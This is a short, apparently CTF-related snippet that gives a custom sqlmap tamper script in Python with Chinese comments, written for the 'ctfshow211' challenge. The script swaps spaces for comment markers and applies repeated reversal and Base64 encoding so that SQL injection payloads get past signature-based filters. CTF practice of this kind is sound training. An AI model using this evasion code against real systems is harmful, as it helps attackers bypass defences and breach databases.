&lt;p&gt;&lt;strong&gt;自定义脚本 &lt;code&gt;ctfshow211sqlmap.py&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;#!/usr/bin/env python
#ctfshow211 by AlgoZZi
#ctfshow211sqlmap.py

from lib.core.enums import PRIORITY
from lib.core.common import singleTimeWarnMessage
import base64

__priority__ = PRIORITY.LOW

def dependencies():
    # 加载依赖时提示，仅显示一次
    singleTimeWarnMessage(&amp;quot;自定义 tamper 脚本已加载&amp;quot;)

def tamper(payload, **kwargs):
    &amp;quot;&amp;quot;&amp;quot;
    自定义 tamper 脚本
    功能说明：
        1. 对 payload 进行双重编码和逆序处理
        2. 具体流程：
            - 使用 &amp;quot;/**/&amp;quot; 绕过空格过滤
            - 将 payload 转为字节串
            - 先整体逆序
            - Base64 编码
            - 再次逆序
            - 再次 Base64 编码
            - 最终输出字符串形式
    用途：
        用于在 SQL 注入过程中对 payload 进行混淆编码，
        以绕过部分基于特征的安全检测。
    &amp;quot;&amp;quot;&amp;quot;

    retVal = payload

    if payload:
        # 使用 &amp;quot;/**/&amp;quot; 绕过空格过滤
        retVal = retVal.replace(&amp;quot; &amp;quot;, &amp;quot;/**/&amp;quot;)
        # 转为字节串
        retVal = retVal.encode()
        # 第一次逆序
        retVal = retVal[::-1]
        # 第一次 Base64 编码
        retVal = base64.b64encode(retVal)
        # 第二次逆序
        retVal = retVal[::-1]
        # 第二次 Base64 编码
        retVal = base64.b64encode(retVal)
        # 转回字符串输出
        retVal = retVal.decode()

    return retVal
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
